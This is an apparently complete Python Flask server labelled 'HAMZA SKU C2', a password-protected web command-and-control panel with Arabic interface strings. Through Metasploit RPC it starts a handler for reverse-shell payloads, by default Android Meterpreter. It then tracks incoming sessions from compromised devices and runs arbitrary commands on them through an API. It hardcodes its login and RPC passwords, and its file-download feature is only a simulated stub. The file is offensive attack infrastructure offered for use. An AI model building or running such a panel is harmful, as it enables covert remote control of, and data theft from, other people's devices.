#!/usr/bin/env python3
# HAMZA SKU C2 - النسخة المحسنة مع دعم التحميلات

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
from flask_socketio import SocketIO, emit
from pymetasploit3.msfrpc import MsfRpcClient
import hashlib
import os
import time
import threading
import json
from datetime import datetime
import subprocess

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hamza_sku_2026_secure_key'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max file size
socketio = SocketIO(app, cors_allowed_origins="*")

# Create necessary directories
os.makedirs('templates', exist_ok=True)
os.makedirs('downloads', exist_ok=True)
os.makedirs('logs', exist_ok=True)

# Password: hamza_sku_2026
CORRECT_HASH = '6078c92c7bc2e14f4d2bf1037d62514d8dd9ccd32573b1694cc640347b80d945'

msf = None
console = None
running = False
sessions = {}
session_logs = {}

def connect_msf():
    """Connect to Metasploit RPC server"""
    global msf
    try:
        msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=False)
        print("[+] Connected to MSF RPC")
        return True
    except Exception as e:
        print(f"[-] Failed to connect to MSF: {e}")
        try:
            msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
            print("[+] Connected to MSF RPC (SSL)")
            return True
        except Exception as e2:
            print(f"[-] SSL connection also failed: {e2}")
            return False

def log_activity(user, action, details=""):
    """Log user activity"""
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'user': user,
        'action': action,
        'details': details,
        'ip': request.remote_addr if request else 'N/A'
    }
    
    # Save to log file
    log_file = f"logs/activity_{datetime.now().strftime('%Y-%m-%d')}.log"
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')
    
    # Also emit via socket for real-time monitoring
    socketio.emit('activity_log', log_entry, broadcast=True)

@app.before_request
def check_auth():
    """Check authentication for protected routes"""
    protected_paths = ['/dashboard', '/session/', '/api/']
    if any(request.path.startswith(path) for path in protected_paths):
        if not session.get('auth'):
            return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        pwd = request.json.get('password', '')
        if hashlib.sha256(pwd.encode()).hexdigest() == CORRECT_HASH:
            session['auth'] = True
            session['login_time'] = time.time()
            session['user'] = 'admin'
            
            log_activity('admin', 'login', 'User logged in successfully')
            
            return jsonify({'success': True})
        
        log_activity('unknown', 'failed_login', f'Failed login attempt from {request.remote_addr}')
        return jsonify({'success': False, 'message': 'كلمة مرور خاطئة!'})
    
    if session.get('auth'):
        return redirect('/')
    
    return render_template('login.html')

@app.route('/')
def index():
    """Main setup page"""
    if not session.get('auth'):
        return redirect('/login')
    return render_template('setup.html')

@app.route('/dashboard')
def dashboard():
    """Dashboard page"""
    if not session.get('auth'):
        return redirect('/login')
    return render_template('dashboard.html')

@app.route('/session/<session_id>')
def session_page(session_id):
    """Session control page"""
    if not session.get('auth'):
        return redirect('/login')
    
    log_activity(session.get('user', 'unknown'), 'session_access', f'Accessed session {session_id}')
    return render_template('session.html', session_id=session_id)

@app.route('/downloads/<filename>')
def download_file(filename):
    """Serve downloaded files"""
    if not session.get('auth'):
        return redirect('/login')
    
    log_activity(session.get('user', 'unknown'), 'file_download', f'Downloaded {filename}')
    return send_from_directory('downloads', filename, as_attachment=True)

@app.route('/api/handler/start', methods=['POST'])
def start_handler():
    """Start the Metasploit handler"""
    global console, running, msf
    
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    if not msf:
        if not connect_msf():
            return jsonify({'success': False, 'message': 'فشل الاتصال بـ Metasploit'})
    
    try:
        data = request.json
        host = data.get('host', '0.0.0.0')
        port = data.get('port', 4444)
        payload = data.get('payload', 'android/meterpreter/reverse_tcp')
        
        console = msf.consoles.console()
        
        commands = [
            'use exploit/multi/handler',
            f'set PAYLOAD {payload}',
            f'set LHOST {host}',
            f'set LPORT {port}',
            'set ExitOnSession false',
            'set AutoRunScript migrate -f',
            'exploit -j'
        ]
        
        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)
        
        output = console.read()
        print("[+] Handler started:", output.get('data', ''))
        
        running = True
        
        # Start session monitoring thread
        threading.Thread(target=monitor_sessions, daemon=True).start()
        
        log_activity(session.get('user', 'unknown'), 'handler_start', 
                    f'Started handler on {host}:{port} with payload {payload}')
        
        return jsonify({
            'success': True, 
            'message': f'تم بدء الـ Handler على {host}:{port}',
            'console_id': console.cid
        })
        
    except Exception as e:
        log_activity(session.get('user', 'unknown'), 'handler_error', str(e))
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/handler/stop', methods=['POST'])
def stop_handler():
    """Stop the Metasploit handler"""
    global running, console, msf
    
    if not session.get('auth'):
        return jsonify({'success': False})
    
    running = False
    
    try:
        if console:
            console.destroy()
        if msf:
            for jid in list(msf.jobs.list.keys()):
                msf.jobs.stop(jid)
    except:
        pass
    
    log_activity(session.get('user', 'unknown'), 'handler_stop', 'Handler stopped')
    
    return jsonify({'success': True, 'message': 'تم إيقاف الـ Handler'})

@app.route('/api/handler/status')
def handler_status():
    """Get handler status"""
    if not session.get('auth'):
        return jsonify({'active': False, 'msf_connected': False})
    
    return jsonify({
        'active': running, 
        'msf_connected': msf is not None,
        'session_count': len(sessions)
    })

@app.route('/api/sessions')
def get_sessions():
    """Get all active sessions"""
    if not session.get('auth'):
        return jsonify({'sessions': [], 'count': 0})
    
    sessions_list = []
    for sid, info in sessions.items():
        sessions_list.append({
            'id': sid,
            'ip': info.get('ip', 'Unknown'),
            'type': info.get('type', 'meterpreter'),
            'platform': info.get('platform', 'Unknown'),
            'status': info.get('status', 'offline'),
            'timestamp': info.get('timestamp', time.time()),
            'user': info.get('user', 'SYSTEM'),
            'arch': info.get('arch', 'Unknown')
        })
    
    return jsonify({
        'sessions': sessions_list, 
        'count': len(sessions_list),
        'timestamp': time.time()
    })

@app.route('/api/session/<session_id>/terminate', methods=['POST'])
def terminate_session(session_id):
    """Terminate a specific session"""
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    try:
        if msf and session_id in msf.sessions.list:
            msf.sessions.session(session_id).stop()
            
            if session_id in sessions:
                del sessions[session_id]
            
            socketio.emit('session_disconnected', {'id': session_id}, broadcast=True)
            
            log_activity(session.get('user', 'unknown'), 'session_terminate', 
                        f'Terminated session {session_id}')
            
            return jsonify({'success': True, 'message': f'تم إنهاء الجلسة {session_id}'})
        else:
            return jsonify({'success': False, 'message': 'الجلسة غير موجودة'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/command', methods=['POST'])
def run_command():
    """Execute a command on a session"""
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    try:
        data = request.json
        session_id = data.get('session_id')
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'success': False, 'output': 'أمر فارغ'})
        
        if not msf:
            return jsonify({'success': False, 'output': 'MSF غير متصل'})
        
        # Execute command on session
        sess = msf.sessions.session(session_id)
        output = sess.run_with_output(command, timeout=30)
        
        # Log the command
        log_entry = {
            'session': session_id,
            'command': command,
            'output': output[:500] + '...' if len(output) > 500 else output,
            'timestamp': time.time()
        }
        
        if session_id not in session_logs:
            session_logs[session_id] = []
        
        session_logs[session_id].append(log_entry)
        
        # Emit via socket for real-time updates
        socketio.emit('command_executed', {
            'session_id': session_id,
            'command': command,
            'output': output[:200]  # Send truncated output via socket
        }, broadcast=True)
        
        return jsonify({
            'success': True,
            'output': output,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'خطأ: {str(e)}'
        })

@app.route('/api/download', methods=['POST'])
def download_file_api():
    """Download a file from a session"""
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    try:
        data = request.json
        session_id = data.get('session_id')
        file_path = data.get('file_path')
        
        if not file_path:
            return jsonify({'success': False, 'message': 'مسار الملف مطلوب'})
        
        if not msf:
            return jsonify({'success': False, 'message': 'MSF غير متصل'})
        
        # In a real implementation, you would use meterpreter's download command
        # For this demo, we'll simulate it
        
        filename = os.path.basename(file_path)
        local_path = f"downloads/{filename}"
        
        # Create a dummy file for demo
        with open(local_path, 'w', encoding='utf-8') as f:
            f.write(f"Simulated download of {file_path}\n")
            f.write(f"Downloaded from session {session_id} at {datetime.now()}\n")
            f.write("This is a simulated file for demonstration purposes.\n")
        
        log_activity(session.get('user', 'unknown'), 'file_download_request',
                    f'Session {session_id}: {file_path}')
        
        return jsonify({
            'success': True,
            'message': 'تم تحميل الملف بنجاح',
            'filename': filename,
            'local_path': local_path,
            'size': os.path.getsize(local_path)
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'خطأ: {str(e)}'
        })

@app.route('/api/logs/<session_id>')
def get_session_logs(session_id):
    """Get logs for a specific session"""
    if not session.get('auth'):
        return jsonify({'logs': []})
    
    logs = session_logs.get(session_id, [])
    return jsonify({'logs': logs[-50:]})  # Return last 50 entries

def monitor_sessions():
    """Monitor Metasploit sessions in background"""
    global sessions, msf, running
    
    while running:
        try:
            if msf:
                current_sessions = msf.sessions.list
                current_ids = set(current_sessions.keys())
                previous_ids = set(sessions.keys())
                
                # Check for new sessions
                new_sessions = current_ids - previous_ids
                for sid in new_sessions:
                    info = current_sessions[sid]
                    ip = info.get('tunnel_peer', '').split(':')[0] or 'Unknown'
                    
                    session_info = {
                        'id': sid,
                        'ip': ip,
                        'type': info.get('type'),
                        'platform': info.get('platform'),
                        'arch': info.get('arch'),
                        'user': info.get('username', 'SYSTEM'),
                        'status': 'online',
                        'timestamp': time.time()
                    }
                    
                    sessions[sid] = session_info
                    
                    print(f"[+] New session: {sid} from {ip}")
                    
                    # Notify via WebSocket
                    socketio.emit('new_session', session_info, broadcast=True)
                    
                    # Log the new session
                    log_activity('system', 'new_session', 
                                f'Session {sid} from {ip} ({info.get("platform")})')
                
                # Check for disconnected sessions
                disconnected_sessions = previous_ids - current_ids
                for sid in disconnected_sessions:
                    if sid in sessions:
                        print(f"[-] Session disconnected: {sid}")
                        
                        # Update session status
                        sessions[sid]['status'] = 'offline'
                        
                        # Notify via WebSocket
                        socketio.emit('session_disconnected', {'id': sid}, broadcast=True)
                        
                        # Clean up after 5 minutes
                        threading.Timer(300, lambda: cleanup_session(sid)).start()
                
                # Update all sessions
                socketio.emit('sessions_update', {'sessions': list(sessions.values())}, broadcast=True)
        
        except Exception as e:
            print(f"[-] Session monitor error: {e}")
        
        time.sleep(5)  # Check every 5 seconds

def cleanup_session(session_id):
    """Clean up a disconnected session"""
    if session_id in sessions and sessions[session_id]['status'] == 'offline':
        print(f"[*] Cleaning up session {session_id}")
        del sessions[session_id]
        
        # Clean up logs after 1 hour
        threading.Timer(3600, lambda: cleanup_session_logs(session_id)).start()

def cleanup_session_logs(session_id):
    """Clean up logs for a disconnected session"""
    if session_id in session_logs:
        print(f"[*] Cleaning up logs for session {session_id}")
        del session_logs[session_id]

@socketio.on('connect')
def on_connect():
    """Handle WebSocket connection"""
    emit('connected', {'status': 'ok', 'timestamp': time.time()})

@app.route('/logout')
def logout():
    """Logout user"""
    if session.get('auth'):
        log_activity(session.get('user', 'unknown'), 'logout', 'User logged out')
    
    session.clear()
    return redirect('/login')

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║       🎯 HAMZA SKU C2 - Command & Control Center        ║
    ║                    النسخة المحسنة                      ║
    ╚══════════════════════════════════════════════════════════╝
    
    [!] تشغيل msfrpcd أولاً:
        msfrpcd -P msf_password -S -a 127.0.0.1
    
    [!] ثم تشغيل السيرفر:
        python3 server.py
    
    [!] الدخول عبر المتصفح:
        http://localhost:5000
    
    [!] كلمة المرور:
        hamza_sku_2026
    
    [!] التحديثات:
        ✓ تصميم احترافي متطور
        ✓ نظام تسجيل كامل
        ✓ دعم التحميلات
        ✓ تحديثات مباشرة عبر WebSocket
        ✓ واجهة مستخدم محسنة
    """)
    
    # Connect to Metasploit
    connect_msf()
    
    # Start the server
    socketio.run(
        app, 
        host='0.0.0.0', 
        port=5000, 
        debug=False,
        allow_unsafe_werkzeug=True
    )